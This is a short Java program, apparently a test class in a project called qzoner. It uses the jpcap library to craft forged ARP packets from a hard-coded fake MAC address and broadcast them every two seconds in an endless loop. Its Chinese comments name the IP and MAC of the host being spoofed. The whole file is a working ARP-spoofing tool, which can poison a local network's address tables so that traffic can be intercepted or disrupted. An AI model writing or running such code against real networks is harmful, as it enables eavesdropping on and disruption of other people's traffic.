package org.jasic.qzoner.test;
/**
 * User: Jasic
 * Date: 13-9-10
 */


import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;

import java.net.InetAddress;

import static org.jasic.utils.SystemUtil.macStrToByte;

public class ArpSender {


    public static void main(String[] args) throws Exception {
        int time = 2;  // 重发间隔时间

        byte[] eth_src_mac = macStrToByte("78-45-C4-05-80-1D");
        byte[] eth_dst_mac = macStrToByte("FF-FF-FF-FF-FF-FF");

        InetAddress desip = InetAddress.getByName("127.16.27.1");// 被欺骗的目标IP地址
        byte[] desmac = macStrToByte("00-23-eb-72-a0-3f");// 被欺骗的目标目标MAC数组
        InetAddress srcip = InetAddress.getByName("127.16.27.103");// 源IP地址
        byte[] srcmac = macStrToByte("78-45-C4-05-80-1D"); // 假的MAC数组
        // 枚举网卡并打开设备
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        NetworkInterface device = devices[1];
        JpcapSender sender = JpcapSender.openDevice(device);

        // 设置ARP包
        ARPPacket arp = new ARPPacket();
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        arp.operation = ARPPacket.ARP_REQUEST;
        arp.hlen = 6;
        arp.plen = 4;
        arp.sender_hardaddr = srcmac;
        arp.sender_protoaddr = srcip.getAddress();
        arp.target_hardaddr = desmac;
        arp.target_protoaddr = desip.getAddress();
        // 设置DLC帧
        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = eth_src_mac;
        ether.dst_mac = eth_dst_mac;
        arp.datalink = ether;
        // 发送ARP应答包
        while (true) {
            System.out.println("sending arp..");
            sender.sendPacket(arp);
            Thread.sleep(time * 1000);
        }
    }
}

